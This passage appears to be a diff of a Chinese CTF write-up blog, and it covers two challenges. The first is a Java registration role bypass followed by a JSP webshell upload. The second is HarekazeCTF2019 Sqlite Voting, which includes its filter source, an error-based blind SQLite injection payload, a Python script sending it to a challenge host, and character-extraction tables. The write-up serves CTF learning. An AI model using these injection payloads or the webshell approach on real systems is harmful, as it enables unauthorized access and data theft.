&lt;/filter-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE web-app PUBLIC
+ &quot;-&#x2F;&#x2F;Sun Microsystems, Inc.&#x2F;&#x2F;DTD Web Application 2.3&#x2F;&#x2F;EN&quot;
+ &quot;http:&#x2F;&#x2F;java.sun.com&#x2F;dtd&#x2F;web-app_2_3.dtd&quot; &gt;
+
+&lt;web-app&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;&#x2F;servlet-class&gt;
+  &lt;&#x2F;servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;logout&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;home&#x2F;download&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;register&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;login&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;home&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;
+    &lt;url-pattern&gt;&#x2F;home&#x2F;upload&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;servlet-mapping&gt;
+
+  &lt;filter&gt;
+    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;
+    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;&#x2F;filter-class&gt;
+  &lt;&#x2F;filter&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;
+    &lt;url-pattern&gt;&#x2F;home&#x2F;*&lt;&#x2F;url-pattern&gt;
+  &lt;&#x2F;filter-mapping&gt;
+  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;
+
+  &lt;welcome-file-list&gt;
+    &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;
+  &lt;&#x2F;welcome-file-list&gt;
+&lt;&#x2F;web-app&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>那我们该如何成为admin呢，直接看注册类中的关键代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;</span><br><span class="line">    <span class="keyword">var</span> = <span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>);</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">    person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> <span class="token operator">=</span> <span class="token keyword">var</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>role<span class="token punctuation">,</span> <span class="token string">"\"role\":\"guest\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    person<span class="token punctuation">.</span><span class="token function">setRole</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此处对我们传入的data注册信息进行了处理，将role的json内容换成了guest，也就是说我们直接更改data中的role属性是行不通的，这里我们可以使用unicode字符绕过，并且在属性中多添加一层内容使其中包含了role属性来确保我们能够进入第一个判断，构造出的payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>注册成功并且成功进入文件上传界面<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png"> </p>
 <p>传一个jsp马到static目录下连接即可</p>
 <p>但是似乎buu的这个版本是修复后的，对文件内容进行了过滤，没法传🐎，我有什么办法（</p>
 <h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>源码全是过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token comment">// dangerous chars</span>
+    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span>
+    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>
+    <span class="token comment">// whitespace chars</span>
+    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span>
+    <span class="token comment">// dangerous functions</span>
+    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span>
+  <span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// check user input</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// update database</span>
+<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// succeeded!</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>没见过的sqlite，题解</p>
 <blockquote>
 <p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p>
 <p>利用ifnull,nullif注入flag长度</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这句语句的意思是，如果前面的length的值等于我们传入i的值，那么nullif就会返回null，如果返回了null那么ifnull就会返回后面的值，此时abs溢出报错，可以拿到flag长度</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:<span class="string">f&#x27;abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="subst">&#123;i&#125;</span>),0x8000000000000000))&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length: &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php"</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">),0x8000000000000000))'</span></span>
+    <span class="token punctuation">&#125;</span>
+    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'An error occurred'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'length: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后通过||来拼接字符，通过replace来进行逐位猜测，通过返回的长度来做判断，而对于字母则使用hex来提取</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span> <span class="comment"># &#x27;zebra&#x27; → &#x27;7A65627261&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span> <span class="comment"># &#x27;real&#x27; → &#x27;7265616C&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span> <span class="comment"># 0xffffffffffffffff = -1 → &#x27;2D31&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span> <span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span> <span class="comment"># &#x27;dog&#x27; → &#x27;646F67&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span> <span class="comment"># &#x27;koala&#x27; → &#x27;6B6F616C61&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="token comment"># 'zebra' → '7A65627261'</span>
+table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span> <span class="token comment"># 'real' → '7265616C'</span>
+table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="token comment"># 0xffffffffffffffff = -1 → '2D31'</span>
+table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span> <span class="token comment"># 0.1 → 302E31</span>
+table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="token comment"># 'dog' → '646F67'</span>
